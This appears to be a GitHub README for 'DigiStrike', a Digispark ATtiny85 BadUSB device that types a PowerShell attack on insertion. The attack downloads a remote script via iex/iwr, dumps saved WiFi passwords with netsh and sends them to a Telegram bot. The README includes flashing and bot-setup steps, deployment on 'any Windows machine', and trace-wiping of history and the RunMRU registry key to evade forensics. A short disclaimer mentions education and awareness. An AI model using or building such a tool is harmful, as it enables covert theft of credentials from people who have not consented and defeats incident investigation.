<!-- 
  META DESCRIPTION: DigiStrike — Digispark ATtiny85 BadUSB cybersecurity demonstration tool
  that silently dumps saved WiFi credentials via HID keyboard injection and exfiltrates them
  to Telegram in under 25 seconds. Built for college exhibitions and security awareness.
  Keywords: BadUSB, Digispark, ATtiny85, HID attack, WiFi credential dumper, cybersecurity,
  penetration testing, red team, Arduino, PowerShell payload, keyboard injection, USB attack.
-->

<div align="center">

# ⚡ DigiStrike

### *BadUSB WiFi Credential Exfiltrator — Digispark ATtiny85*

[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![Language](https://img.shields.io/badge/Language-Arduino%20%7C%20PowerShell-00979D?style=for-the-badge&logo=arduino&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue?style=for-the-badge)](LICENSE)
[![Category](https://img.shields.io/badge/Category-BadUSB%20%7C%20Red%20Team-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![Cost](https://img.shields.io/badge/Hardware%20Cost-%3C%20₹300%20(~%243)-brightgreen?style=for-the-badge)](https://github.com/Esther7171/-DigiStrike)
[![Execution](https://img.shields.io/badge/Execution%20Time-~24.3s-orange?style=for-the-badge)](https://github.com/Esther7171/-DigiStrike)

**Plug in. Register as keyboard. Dump credentials. Exfiltrate. Vanish in under 25 seconds.**

*A Digispark ATtiny85 based BadUSB tool built for college exhibitions and cybersecurity awareness.*

```
  ██████╗ ██╗ ██████╗ ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
  ██╔══██╗██║██╔════╝ ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
  ██║  ██║██║██║  ███╗██║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
  ██║  ██║██║██║   ██║██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
  ██████╔╝██║╚██████╔╝██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
  ╚═════╝ ╚═╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
```

</div>

---

## Table of Contents

- [What is Digispark / ATtiny85](#what-is-digispark--attiny85)
- [What DigiStrike Does](#what-digistrike-does)
- [Execution Timeline](#execution-timeline)
- [Why Digispark](#why-digispark)
- [Zero Trace Design](#zero-trace-design)
- [How It Works](#how-it-works)
- [Setup Guide](#setup-guide)
- [File Structure](#file-structure)
- [Disclaimer](#disclaimer)
- [License](#license)
- [Author](#author)

---

## What is Digispark / ATtiny85

The **Digispark** is a microcontroller board built around the **Atmel ATtiny85** chip. It is widely used in hardware security research, red team engagements and CTF competitions precisely because of one key property: the OS sees it as a keyboard, not a USB drive.

| Property | Detail |
|----------|--------|
| Disguise | Registers as HID keyboard — no USB storage ever appears |
| AV Bypass | No antivirus triggers, no USB device logs, no driver install |
| Cost | Under ₹300 (~$3 USD) — cheapest HID attack hardware available |
| Size | Smaller than a thumb |
| Customizable | Any keyboard payload programmable via Arduino IDE |
| Real-World Use | Used in actual penetration testing engagements |
| CTF / Red Team | Standard tool in red team kits and CTF hardware challenges |

Because the host OS trusts HID devices unconditionally, no admin prompt appears and no antivirus fires. The machine just sees someone typing extremely fast.

---

## What DigiStrike Does

DigiStrike is a fully automated BadUSB payload. The moment it is plugged in, it runs a complete WiFi credential exfiltration attack with no user interaction required.

```
Step 01   Plugged into target PC
Step 02   OS enumerates it as a trusted HID keyboard
Step 03   Opens PowerShell silently via Win+R
Step 04   Injects bot token and chat ID as environment variables
Step 05   Pulls void.ps1 from GitHub via iex + iwr
Step 06   Dumps all saved WiFi credentials using netsh wlan
Step 07   Sends the credentials file to Telegram
Step 08   Deletes the temp file (randomized name each run)
Step 09   Clears PowerShell session history and PSReadLine buffer
Step 10   Wipes the Win+R MRU registry key
Step 11   Exits PowerShell
Step 12   Zero traces left on the system
```

No installation. No UAC prompt. No antivirus alert.

---

## Execution Timeline

Every delay is hardcoded into the chip at flash time. The attack is fully deterministic.

| # | Phase | Action | Time |
|---|-------|--------|------|
| 1 | HID Stabilize | Wait for Windows to enumerate the device | `3.0s` |
| 2 | Win+R | Open the Run dialog | `1.0s` |
| 3 | PowerShell Open | Type command, send Enter, wait for window | `4.0s` |
| 4 | Token Injection | Set `$env:TK` as environment variable | `0.4s` |
| 5 | Chat ID Injection | Set `$env:CI` as environment variable | `0.4s` |
| 6 | Payload Execution | Download `void.ps1`, run it, exfiltrate | `15.0s` |
| 7 | Clean Exit | Type `exit`, close PowerShell | `0.5s` |
| | | **Total — plug to done** | **`~24.3s`** |

The entire attack finishes in under 25 seconds.

---

## Why Digispark

Compared to other HID attack platforms, the Digispark wins on cost and accessibility by a wide margin.

| Feature | Digispark ATtiny85 | USB Rubber Ducky | USB Ninja |
|---------|:-----------------:|:---------------:|:---------:|
| Price | **< ₹300 (~$3)** | ~$80 USD | ~$100 USD |
| Size | Thumb-sized | Small | Small |
| Detected as | HID Keyboard | HID Keyboard | HID Keyboard |
| Custom Payloads | Arduino C | DuckyScript | Limited |
| Drivers Required | None | None | None |
| OS Support | Win / Linux / Mac | Win / Linux / Mac | Windows |
| Plug and Play | Yes | Yes | Yes |
| Beginner Friendly | Arduino IDE | Proprietary IDE | Complex |

95% of the capability at 1% of the cost.

---

## Zero Trace Design

Every artifact the attack leaves behind is cleaned up before the device is removed.

| Trace Vector | What Happens |
|-------------|-------------|
| Temp file name | Generated with `Get-Random` so it is different every run |
| Temp file on disk | Deleted with `Remove-Item -Force` right after exfiltration |
| PowerShell history | `Clear-History` wipes the in-session history |
| PSReadLine history | `[PSConsoleReadLine]::ClearHistory()` clears the persistent buffer |
| Win+R MRU registry | `RunMRU` key removed via `Remove-ItemProperty` |
| USB device logs | HID class devices produce no USB storage event log entries |
| Credentials in firmware | Token and chat ID are typed live as env vars, never in the script |
| GitHub script | `void.ps1` has zero secrets, safe to host publicly |

After the device is unplugged, there is nothing left to find.

---

## How It Works

```
╔═════════════════════════════════════════════════════════════════╗
║                   DIGISTRIKE — ATTACK FLOW                     ║
╚═════════════════════════════════════════════════════════════════╝

  ┌───────────┐      ┌──────────────────┐      ┌────────────────┐
  │  PLUG IN  │─────►│  HID DETECTED    │─────►│  PS OPENS      │
  │           │      │  OS trusts it    │      │  via Win+R     │
  │  t = 0s   │      │  as keyboard     │      │  silently      │
  └───────────┘      └──────────────────┘      └───────┬────────┘
                                                        │
                  ┌─────────────────────────────────────┘
                  ▼
     ┌────────────────────┐      ┌──────────────────────┐
     │  ENV VARS INJECTED │─────►│  GITHUB PULL         │
     │  $env:TK  token    │      │  iex(iwr void.ps1)   │
     │  $env:CI  chatid   │      │  downloaded live     │
     └────────────────────┘      └──────────┬───────────┘
                                            │
                  ┌─────────────────────────┘
                  ▼
     ┌────────────────────┐      ┌──────────────────────┐
     │  WIFI CREDS DUMPED │─────►│  SENT TO TELEGRAM    │
     │  netsh wlan        │      │  curl.exe POST       │
     │  random tmp file   │      │  document upload     │
     └────────────────────┘      └──────────┬───────────┘
                                            │
                  ┌─────────────────────────┘
                  ▼
     ┌────────────────────┐      ┌──────────────────────┐
     │  TRACES DESTROYED  │─────►│  DONE                │
     │  temp file         │      │                      │
     │  PS history        │      │  Total: ~24.3s       │
     │  registry MRU      │      │  Zero artifacts      │
     └────────────────────┘      └──────────────────────┘

  [Digispark] → HID → [Windows] → Win+R → [PowerShell] → iex → [GitHub]
                                               │
                                        [netsh wlan] → [tmp file] → [Telegram 📱]
```

---

## Setup Guide

### Prerequisites

- Arduino IDE 1.8.x (recommended — 2.x has known upload timing issues with Digispark)
- A Digispark ATtiny85 board
- A Telegram bot for receiving the exfiltrated data

---

### Step 1 — Board Manager

Open Arduino IDE → `File` → `Preferences`

Paste this in the *Additional Board Manager URLs* field:
```
http://digistump.com/package_digistump_index.json
```

Go to `Tools` → `Board` → `Board Manager`, search **Digistump AVR Boards** and install.

Select the board:
```
Tools → Board → Digistump AVR Boards → Digispark (Default - 16.5mhz)
```

> Do not select a COM port. Digispark handles this during upload.

---

### Step 2 — DigiKeyboard Library

`DigiKeyboard.h` ships with the Digistump board package. No separate install needed.

If it is missing:
```
Sketch → Include Library → Manage Libraries → search "DigiKeyboard" → Install
```

---

### Step 3 — Configure the Payload

Open [digispark/r00t_b0t.ino](digispark/r00t_b0t.ino) and replace the placeholders:

```cpp
DigiKeyboard.print("$env:TK='your-bot-token-here'");
DigiKeyboard.print("$env:CI='-100xxxxxxxxxx'");
```

These values are typed as live keystrokes. They never touch disk or GitHub.

---

### Step 4 — Flash

Click **Upload** in Arduino IDE. You will see:
```
Running Digispark Uploader...
Plug in device now... (will timeout in 60 seconds)
```

Do not plug in the Digispark before this prompt. Plug it in when asked.

Wait for:
```
>> Micronucleus done. Thank you!
```

Done. The board is ready.

---

### Step 5 — Telegram Bot Setup

Open Telegram → search `@BotFather` → send `/newbot` → follow the prompts.

Copy the API token:
```
123456789:ABCDefghIJKlmnoPQRstUVwxyz
```

Get your chat ID by visiting:
```
https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
```

Look for `"chat":{"id": -100XXXXXXXXXX}` in the response.

Paste both values into the `.ino` file as shown in Step 3 and reflash.

---

### Step 6 — Deploy

Plug the flashed Digispark into any Windows machine with saved WiFi networks. In roughly 24 seconds a `.txt` file containing all saved SSIDs and plaintext passwords will arrive in your Telegram, labelled with the target machine name and username.

---

## File Structure

```
-DigiStrike/
├── README.md
├── LICENSE
├── digispark/
│   └── r00t_b0t.ino        ← ATtiny85 sketch, handles all keystrokes
└── scripts/
    └── void.ps1            ← PowerShell payload, hosted on GitHub
```

| File | Role |
|------|------|
| [digispark/r00t_b0t.ino](digispark/r00t_b0t.ino) | Flashed to the chip. Opens PS, injects env vars, fires the payload. |
| [scripts/void.ps1](scripts/void.ps1) | Fetched at runtime. Dumps creds, exfiltrates, cleans all traces. |

---

## Disclaimer

This project is for educational use and authorized security research only.

- Use only on devices you own or have explicit written permission to test
- Suitable for college exhibitions, CTF labs and cybersecurity awareness workshops
- Unauthorized use violates the IT Act (India), CFAA (USA) and equivalent laws worldwide
- The author takes no responsibility for misuse or any consequences arising from it

---

## License

BSD 3-Clause License
Copyright (c) 2026 Esther7171

See [LICENSE](LICENSE) for the full text.

---

## Author

**Esther7171**

[![GitHub](https://img.shields.io/badge/GitHub-Esther7171-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171)
[![DeathEsther](https://img.shields.io/badge/Project-DeathEsther-8B0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171/DeathEsther)

---

<div align="center">

If this helped you understand how BadUSB attacks work, drop a ⭐

</div>
